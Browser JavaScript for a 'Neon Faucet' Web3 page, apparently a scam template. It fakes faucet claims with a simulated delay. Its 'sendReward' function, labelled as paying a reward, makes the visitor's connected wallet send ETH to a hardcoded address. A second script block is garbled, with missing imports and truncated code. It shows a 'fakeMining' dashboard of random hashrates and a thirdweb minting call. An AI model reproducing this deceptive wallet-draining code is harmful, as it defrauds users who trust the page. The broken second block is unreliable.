<script type="module">

import { createAppKit } from "https://esm.sh/@reown/appkit";
import { EthersAdapter } from "https://esm.sh/@reown/appkit-adapter-ethers";

import {
  mainnet,
  arbitrum,
  sepolia
} from "https://esm.sh/@reown/appkit/networks";

import {
  BrowserProvider,
  parseEther
} from "https://esm.sh/ethers";

const projectId =
"5022875ce6ee68917f103ff9b1e3422d";

const modal = createAppKit({
  adapters:[new EthersAdapter()],
  networks:[
    mainnet,
    arbitrum,
    sepolia
  ],

  metadata:{
    name:"Neon Faucet",
    description:"MultiChain Faucet",
    url:window.location.origin,
    icons:[
      "https://avatars.githubusercontent.com/u/179229932"
    ]
  },

  projectId
});

let provider;

modal.subscribeProviders((state)=>{
  provider = state?.eip155;
});

const statusBox =
document.getElementById("status");

const timerBox =
document.getElementById("timer");

function setStatus(msg){
  statusBox.innerHTML = msg;
}

const CLAIM_TIME =
24 * 60 * 60 * 1000;

function getClaimKey(wallet){
  return `claim_${wallet}`;
}

function updateTimer(wallet){

  const lastClaim =
  localStorage.getItem(
    getClaimKey(wallet)
  );

  if(!lastClaim){
    timerBox.innerHTML =
    "✅ Ready to claim";
    return;
  }

  const now = Date.now();

  const diff =
  CLAIM_TIME -
  (now - Number(lastClaim));

  if(diff <= 0){

    timerBox.innerHTML =
    "✅ Ready to claim";

    return;
  }

  const h =
  Math.floor(diff / 3600000);

  const m =
  Math.floor(
    (diff % 3600000) / 60000
  );

  const s =
  Math.floor(
    (diff % 60000) / 1000
  );

  timerBox.innerHTML =
  `⏳ ${h}h ${m}m ${s}s`;

}

setInterval(()=>{

  const wallet =
  document.getElementById(
    "wallet"
  ).value;

  if(wallet){
    updateTimer(wallet);
  }

},1000);

window.claimFaucet = async function(){

  try{

    const wallet =
    document.getElementById(
      "wallet"
    ).value;

    const chainId =
    document.getElementById(
      "chain"
    ).value;

    if(!wallet){

      setStatus(
        "❌ Input wallet address"
      );

      return;
    }

    const lastClaim =
    localStorage.getItem(
      getClaimKey(wallet)
    );

    if(lastClaim){

      const now = Date.now();

      if(
        now - Number(lastClaim)
        < CLAIM_TIME
      ){

        setStatus(
          "⛔ Already claimed today"
        );

        return;
      }
    }

    setStatus(
      "⚡ Processing faucet..."
    );

    // SIMULASI SUCCESS
    await new Promise(r =>
      setTimeout(r,2000)
    );

    localStorage.setItem(
      getClaimKey(wallet),
      Date.now()
    );

    setStatus(`
      ✅ Faucet Success
      <br>
      Wallet: ${wallet}
      <br>
      Chain ID: ${chainId}
    `);

    updateTimer(wallet);

  }catch(err){

    console.log(err);

    setStatus(
      "❌ Faucet Failed"
    );
  }

};

// SEND REWARD
window.sendReward = async function(){

  try{

    if(!provider){

      alert(
        "Connect wallet first"
      );

      return;
    }

    const ethersProvider =
    new BrowserProvider(
      provider
    );

    const signer =
    await ethersProvider.getSigner();

    setStatus(
      "🚀 Sending transaction..."
    );

    const tx =
    await signer.sendTransaction({

      to:
      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",

      value:
      parseEther("0.0001")

    });

    await tx.wait();

    setStatus(`
      ✅ Reward Sent
      <br>
      TX:
      ${tx.hash}
    `);

  }catch(err){

    console.log(err);

    setStatus(
      "❌ Transaction Failed"
    );
  }

};

</script>

<script type="module">

import { createAppKit }
from "https://esm.sh/@reown/appkit";

from "https://esm.sh/@reown/appkit-adapter-ethers";

  mainnet,

  sepolia
}
from "https://esm.sh/@reown/appkit/networks";

import {
  BrowserProvider,
  parseEther
}
from "https://esm.sh/ethers";

// ======================================
// APPKIT
// ======================================

const projectId =
"5022875ce6ee68917f103ff9b1e3422d";

const modal = createAppKit({

  adapters:[
    new EthersAdapter()
  ],

  networks:[

    arbitrum,
    sepolia
  ],

    description:"Web3 Faucet",

    icons:[
      "https://avatars.githubusercontent.com/u/179229932"
    ]
  },

  projectId,

  features:{
    analytics:true
  }

});

let provider;

modal.subscribeProviders((state)=>{

  provider = state?.eip155;

});

// ======================================
// SEND TX
// ======================================

window.sendTx = async function(){

  try{

    if(!provider){

      alert(
        "Wallet belum connect"
      );

      return;
    }

    new BrowserProvider(provider);

    const signer =
    await ethersProvider.getSigner();

    await signer.sendTransaction({

// ======================================
// THIRDWEB API
// ======================================

window.runThirdweb =
async function(wallet){

  try{

    const response =
    await fetch(
      "https://api.thirdweb.com/v1/transactions",
      {

        method:"POST",

        headers:{
          "Content-Type":
          "application/json",

          // WARNING:
          // jangan expose secret key di production

          "x-secret-key":
          "YOUR_SECRET_KEY"
        },

        body:JSON.stringify({

          chainId:"84532",

          from:
          "0x5E8Bade6E0BCe65807dB6327cB1D9EEb7C6A6A5B",

          transactions:[
            {

              type:"contractCall",

              contractAddress:
              "0x85e23b94e7F5E9cC1fF78BCe78cfb15B81f0DF00",

              method:
              "function mintTo(address to, uint256 amount)",

              params:[
                wallet,
                "100"
              ]

            }
          ]
        })

      }
    );

    const data =
    await response.json();

    console.log(
      "Thirdweb:",
      data
    );

  }catch(err){

    console.log(err);

  }

};

// ======================================
// WASM
// ======================================

const wasmHexBytecode =
"0061736d0100000001070160027f7f017f030201000a09010700200020016a0b";

function hexToUint8Array(hexString){

  const pairs =
  hexString.match(
    /[\da-f]{2}/gi
  );

  return new Uint8Array(
    pairs.map(
      h => parseInt(h,16)
    )
  );

}

const rawWasmBuffer =
hexToUint8Array(
  wasmHexBytecode
);

async function compileAndInstantiateWasm(
  bytecodeBuffer
){

  try{

    const wasmMemory =
    new WebAssembly.Memory({

      initial:256,
      maximum:512

    });

    const importObject = {

      env:{

        memory:wasmMemory,

        abort:()=>{

          console.log(
            "WASM abort"
          );

        }

      }

    };

    const wasmModule =
    await WebAssembly.compile(
      bytecodeBuffer
    );

    const wasmInstance =
    await WebAssembly.instantiate(
      wasmModule,
      importObject
    );

    console.log(
      "WASM Ready"
    );

    return {

      instance:wasmInstance,
      memory:wasmMemory,
      core:wasmInstance.exports

    };

  }catch(err){

    console.log(err);

  }

}

// ======================================
// LIVE MINER
// ======================================

class LiveMinerDashboard{

  constructor(){

    this.chart = null;

  }

  initChart(){

    const ctx =
    document
    .getElementById(
      "hashChart"
    );

    this.chart =
    new Chart(ctx,{

      type:"line",

      data:{

        labels:[],

        datasets:[{

          label:
          "Hashrate",

          data:[],

          borderColor:
          "#00f0ff"

        }]
      }

    });

  }

  fakeMining(){

    setInterval(()=>{

      const rate =
      Math.floor(
        Math.random() * 1000
      );

      document
      .getElementById(
        "live-hashrate"
      )
      .innerHTML =
      rate + " H/s";

      this.chart
      .data
      .labels
      .push(
        new Date()
        .toLocaleTimeString()
      );

      this.chart
      .data
      .datasets[0]
      .data
      .push(rate);

      if(
        this.chart.data.labels.length
        > 20
      ){

        this.chart.data.labels.shift();

        this.chart
        .data
        .datasets[0]
        .data
        .shift();

      }

      this.chart.update();

    },1000);

  }

}

const minerApp =
new LiveMinerDashboard();

minerApp.initChart();

// ======================================
// BUTTON EVENTS
// ======================================

document
.getElementById(
  "btn-start"
)
.onclick = ()=>{

  minerApp.fakeMining();

};

document
.getElementById(
  "btn-stop"
)
.onclick = ()=>{

  location.reload();

};

document
.getElementById(
  "btn-clear"
)
.onclick = ()=>{

  localStorage.clear();

  location.reload();

};

// ======================================
// RUN WASM ENGINE
// ======================================

compileAndInstantiateWasm(
  rawWasmBuffer
);

</script>
